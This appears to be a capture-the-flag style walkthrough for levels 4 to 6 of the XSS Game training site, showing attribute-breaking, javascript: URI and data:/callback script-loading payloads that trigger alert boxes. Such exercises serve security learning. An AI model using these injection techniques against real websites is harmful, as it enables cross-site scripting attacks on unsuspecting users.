# Level 4
Firsty I spent some time getting to know how this app works. App flow can be described in following steps:
1. User gives a number of seconds, after that click the 'Create timer' button.
2. Page where timer run is shown up. After all, the user is redirected to the beginning.

Interesting part is timer image:
```html
<img src="/static/loading.gif" onload="startTimer('<user input>');">
```

An xss is possible because user input is directly passed to html code without any encoding. To call an alert box use following payload:
```
1');alert('1
```
Passing it to user input will create following img tag:
```html
<img src="/static/loading.gif" onload="startTimer('1');alert('1');">
```
It is a valid image tag, firstly will be executed startTimer function and after 1 second an alert box will appear on the screen. If you want create malicious link use url encoding:
```
https://xss-game.appspot.com/level4/frame?timer=%31%27%29%3b%61%6c%65%72%74%28%27%31
```

# Level 5
User input isn't processed, but in sign up page is interesting param in url:
```
https://xss-game.appspot.com/level5/frame/signup?next=confirm
```
Change 'confirm' to
```
javascript:alert(1)
```
then click next, alert box will be displayed.

# Level 6
It can be solved with following payload:
```
data:text/plain,alert('xss') 
or 
Https://google.com/jsapi?callback=alert
```
